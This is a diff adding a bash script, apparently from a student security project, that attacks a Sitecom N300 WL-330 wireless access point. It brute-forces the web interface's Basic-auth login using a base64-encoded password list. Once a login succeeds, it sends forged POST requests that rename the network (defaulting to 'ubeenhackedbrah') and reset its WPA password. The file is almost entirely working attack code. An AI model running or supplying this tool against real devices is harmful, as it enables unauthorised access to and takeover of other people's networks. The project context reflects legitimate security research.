@@ -1,0 +1,137 @@
+#! /bin/bash
+
+# Author: Stan van der Vleuten
+# Date last edited: 15-12-2016
+# This script was written while researching Sitecom n300 wl-330 v1 002 wireless accespoint on vulnerabilities. 
+# This research was done as a schoolproject for Fontys HBO-ICT Cybersecurity situated in Eindhoven, the Netherlands
+# This script uses a vulnerability in the method of authentication the wireless acces point uses at the login for the web interface. 
+# This enables us to use a set of base64 encoded username and passwords to try and bruteforce this device, once a succesfull login has been found
+# The user will also be able to change settings of the device from within this script using CSRF based on default values, bruteforced values or values from input
+# Finally there is an option to convert a passwordlist to the right format and encode it in base 64
+
+function changewifi {
+  response=$(curl -i -s -k  -X 'POST' \
+-H 'Referer: http://'${IPadr}'/wlbasic.asp' -H "Authorization: Basic ${loginAuth}" -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/x-www-form-urlencoded' \
+--data-binary $'apMode=0&band=4&ssid='${ssid}'&chan=12&macAddrValue=54EE7525AED2&wlanMac=000000000000&autoMacClone=no&repeaterSSID=&wlLinkMac1=000000000000&wlLinkMac2=000000000000&wlLinkMac3=000000000000&wlLinkMac4=000000000000&wlan-url=%2Fwlbasic.asp' \
+'http://'${IPadr}'/goform/formWlanSetup')
+ case "$response" in
+  *401* ) echo "failed to set ssid because authention code was not correct";;
+  *200* ) echo "changed ssid" ;;
+  * ) echo "Error...";;
+ esac
+echo
+
+curl -i -s -k  -X 'GET' \
+   -H 'Referer: http://'${IPadr}'/goform/formWlEncrypt' -H "Authorization: Basic ${loginAuth}" -H 'Upgrade-Insecure-Requests: 1' \
+    'http://'${IPadr}'/wlencrypt.asp' > /dev/null 2>&1
+
+
+    response=$(curl -i -s -k  -X 'POST' \
+        -H 'Referer: http://'${IPadr}'/wlencrypt.asp' -H "Authorization: Basic ${loginAuth}" -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/x-www-form-urlencoded' \
+        --data-binary $'wepEnabled=ON&selected_ssid=0&method=2&length=1&format=2selected&defaultTxKeyId=1&key1=&key2=&key3=&key4=&wpaCipher=2&pskFormat=0&pskValue='${password}'&radiusIP=&radiusPort=1812&radiusPass=&submit-url=%2Fwlencrypt.asp' \
+        'http://'${IPadr}'/goform/formWlEncrypt')
+   case "$response" in
+     *401* ) echo "failed to set password because authention code was not correct";;
+    *200* ) echo "changed password" ;;
+    * ) echo "Error...";;
+   esac
+   echo
+
+curl -i -s -k  -X 'POST' \
+     -H 'Referer: http://'${IPadr}'/goform/formWlanSetup'  -H "Authorization: Basic ${loginAuth}" -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/x-www-form-urlencoded' \
+      --data-binary $'submit-url=%2Fwlbasic.asp' \
+    'http://'${IPadr}'/goform/formApply' > /dev/null 2>&1
+  }
+
+read -p "What would you like to do?
+1: run with admin:admin 
+2: create a base64file
+3: run with a base64file
+Choose one:"
+echo
+case $REPLY in
+1)
+  read -p "Do you want to run this program with default values?
+ssid=ubeenhackedbrah
+password=password
+loginAuth = admin:admin
+IP=192.168.0.234
+[Y/N]: " -n 1 -r
+echo
+if [[ $REPLY =~ ^[Yy]$ ]]
+then
+    ssid="ubeenhackedbrah"
+    password="password"
+    loginAuth="YWRtaW46YWRtaW4="
+    IPadr="192.168.0.234"
+
+else
+    read -p "Enter SSID: " ssid
+    read -p "Enter password: " password
+    read -p "Enter login: " loginbeforeb64
+    read -p "Enter IP: " IPadr
+    loginAuth=$(echo -n $loginbeforeb64 | base64 )
+fi
+echo
+changewifi
+  ;;
+2)
+read -p "What is the input filename?
+" FILE
+read -p "What is the ouput filename?
+" resultfilename
+while IFS='' read -r line || [[ -n "$line" ]]; do
+BruteLoginAuth=$(echo -n "admin:$line" | base64 )
+echo $BruteLoginAuth >> $resultfilename
+done < "$FILE"
+;;
+3)
+IPadr="192.168.0.234"
+count=0
+read -p "What is the filename?
+" FILE
+read -p "delay mode?
+[Y/N]: " DELAY
+  while IFS='' read -r line || [[ -n "$line" ]]; do
+    ((count++))
+    loginAuth="$line"
+    response=$(curl -i -s -k  -X 'GET' \
+          -H 'Upgrade-Insecure-Requests: 1'  -H "Authorization: Basic ${loginAuth}" \
+          'http://'${IPadr}'/')
+   case "$response" in
+    *401* ) echo "failed attempt $count";;
+    *302* ) echo "succesfull"
+    succesauth="$line"
+    creds=$(echo -n $line | base64 -d )
+    break
+    ;;
+    * ) echo "Error...";;
+   esac
+   if [[ $DELAY =~ ^[Yy]$ ]]
+   then
+     sleep 0.1
+   fi
+done < "$FILE"
+
+
+if [ -z "$succesauth" ] ;then
+echo " the program has been run, no succesful matches have been found"
+else
+    read -p "A succesful attempt has been found
+$creds is the correct username and password combination
+Do you want to run the script with the following settings?
+ssid=ubeenhackedbrah
+password=password
+loginAuth = $creds
+IP=192.168.0.234
+[Y/N]: "
+  if [[ $REPLY =~ ^[Yy]$ ]]
+    then
+        ssid="ubeenhackedbrah"
+        password="password"
+        loginAuth="$succesauth"
+        IPadr="192.168.0.234"
+        changewifi
+  fi
+fi
+
